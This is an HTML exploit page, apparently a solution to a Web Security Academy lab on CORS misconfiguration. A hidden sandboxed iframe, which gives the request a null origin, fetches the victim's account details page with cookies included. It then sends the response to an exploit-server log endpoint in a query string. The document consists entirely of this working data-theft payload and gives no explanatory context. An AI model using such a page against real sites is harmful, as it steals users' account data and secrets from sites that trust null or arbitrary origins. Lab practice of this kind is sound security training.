<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts"
        srcdoc="
        <script>
            var url='https://[labid].web-security-academy.net';

            fetch(url + '/accountDetails', {
                method:'GET',
                credentials:'include'
            })

            .then( response=>{
                return response.text();
            }
            )

            .then(data=>{
                fetch('https://exploit-[exploit server id].exploit-server.net/log?key=' + encodeURIComponent(data)); 
            })

            .catch(error => console.error('Error during exploit execution:', error));
        </script>
        ">

        </iframe>
        
    </body>
</html>
